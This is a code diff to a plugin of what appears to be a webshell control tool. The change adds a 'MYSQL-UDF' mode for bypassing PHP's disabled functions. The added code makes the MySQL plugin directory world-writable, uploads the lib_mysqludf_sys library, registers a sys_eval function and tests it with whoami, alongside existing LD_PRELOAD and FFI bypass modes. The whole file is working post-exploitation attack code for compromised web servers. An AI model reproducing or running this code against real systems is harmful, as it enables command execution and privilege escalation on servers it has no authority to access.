@@ -1,7 +1,9 @@
-from libs.config import alias, color, gget, gset
 from os import path
 from uuid import uuid4
-from libs.myapp import is_windows, send, get_system_code
+
+from libs.app import readline
+from libs.config import alias, color, gget, gset
+from libs.myapp import execute_sql_command, get_system_code, is_windows, send
 from webshell_plugins.upload import run as upload
 
 mode_to_desc_dict = {-1: color.red("closed"),
@@ -11,7 +13,8 @@ mode_to_desc_dict = {-1: color.red("closed"),
                      4: color.green("LD_PRELOAD"),
                      5: color.green("FFI"),
                      6: color.green("COM"),
-                     7: color.green("imap_open")}
+                     7: color.green("imap_open"),
+                     8: color.green("MYSQL-UDF")}
 mode_linux_set = {1, 2, 4, 5}
 mode_windows_set = {6, }
 mode_require_ext_dict = {5: "FFI", 6: "com_dotnet", 7: "imap"}
@@ -37,7 +40,7 @@ def get_detectd_ext(extname: str):
 
 
 def set_mode(mode: int, test: bool = False):
-    if (mode == 4 and not gget("webshell.ld_preload_path", "webshell", False)):
+    if (mode == 4 and not gget("webshell.ld_preload_path", "webshell", False)):  # ld_preload
         disable_func_list = gget("webshell.disable_functions", "webshell")
         if (not gget("webshell.ld_preload_path", "webshell", None)):
             filename = "/tmp/%s.so" % str(uuid4())
@@ -45,11 +48,12 @@ def set_mode(mode: int, test: bool = False):
             upload_result = upload(
                 path.join(gget("root_path"), "auxiliary", "ld_preload", "ld_preload_x86_64.so"), filename, True)
             if (not upload_result):
+                print(color.red("\nUpload failed\n"))
                 return
             gset("webshell.ld_preload_path", filename, True, "webshell")
             gset("webshell.ld_preload_func", ld_preload_func, True, "webshell")
             if ("putenv" in disable_func_list):
-                print(color.red("\nputenv is disabled.\n"))
+                print(color.red("\nputenv is disabled\n"))
                 return False
             if (not ld_preload_func):
                 print(color.red("\nNo ld_preload function!\n"))
@@ -62,6 +66,55 @@ def set_mode(mode: int, test: bool = False):
         text = res.r_text.strip()
         if ("exist" not in text):
             print(color.red(f"\nNo {ext} extension\n"))
+            return False
+    if (mode == 8):  # udf
+        if (gget("db_connected", "webshell") and gget("db_dbms", "webshell") == "mysql"):
+            print(color.yellow(f"\nDetect plugin dir..."))
+            plugin_dir_res = execute_sql_command(
+                "show variables like '%plugin_dir%';", raw=True)
+            if (len(plugin_dir_res) > 1 and len(plugin_dir_res[1]) > 1):
+                plugin_dir = plugin_dir_res[1][1].strip().replace("\\", "\\\\")
+            else:
+                print(color.red(f"\nCould not find plugin_dir"))
+                return False
+            print(color.yellow(f"\nMake plugin dir..."))
+            phpcode = '''if(!is_dir("%s") and !mkdir("%s", 0777, true)){print("fail");}''' % (
+                plugin_dir, plugin_dir)
+            res = send(phpcode)
+            if (not res or "fail" in res.r_text):
+                print(color.red(f"\nMake plugin dir failed!\n"))
+                return False
+            system = "windows" if (
+                gget("webshell.iswin", "webshell")) else "linux"
+            print("\nReference Information:", gget("webshell.os_version", "webshell"))
+            print("\nInput target system bits (32/64/exit): ", end="")
+            bits = "64"
+            _ = readline().strip()
+            if (_ == "32"):
+                bits = 32
+            elif (_ in ["back", "exit", "quit"] or _ != "64"):
+                return False
+            udf_ext = ".dll" if (gget("webshell.iswin", "webshell")) else ".so"
+            udf_path = plugin_dir + "tmp" + udf_ext
+            print(color.yellow(f"\nUpload {udf_ext[1:]}..."))
+            upload_result = upload(
+                path.join(gget("root_path"), "auxiliary", "udf", "mysql", system, bits, "lib_mysqludf_sys" + udf_ext), udf_path, True)
+            if (not upload_result):
+                print(color.red("\nUpload failed\n"))
+                return
+            gset("webshell.udf_path", udf_path, True, "webshell")
+            print(color.yellow(f"\nCreate function sys_eval..."))
+            execute_sql_command(
+                f"create function sys_eval returns string soname 'tmp{udf_ext}'", raw=True)
+            test_res = execute_sql_command(
+                "select sys_eval('whoami');", raw=True)
+            if (len(test_res) > 1 and len(test_res[1][0])):
+                print(color.green(f"\nCreate funtion success"))
+            else:
+                print(color.red(f"\nCreate funtion failed\n"))
+                return False
+        else:
+            print(color.red(f"\nNo connection to database or dbms isn't mysql\n"))
             return False
     if (not test):
         if (mode == 7):
@@ -148,6 +201,11 @@ def run(mode: str = '0'):
         Need:
         - imap extension
 
+    Mode 8 MYSQL-UDF:
+
+        Need:
+        - db_init
+        - mysql >= 5.1
     """
     if (mode == "close"):
         mode = -1
@@ -156,6 +214,8 @@ def run(mode: str = '0'):
         php_version = gget("webshell.php_version", "webshell")
         if (not php_version.startswith("7.")):
             test_list -= {1, 2, 3}
+        if (not gget("db_connected", "webshell") or gget("db_dbms", "webshell") != "mysql"):
+            test_list -= {8}
         for test_mode in test_list:
             print(f"Try Mode {test_mode} {mode_to_desc_dict[test_mode]}:")
             if (set_mode(test_mode, True)):
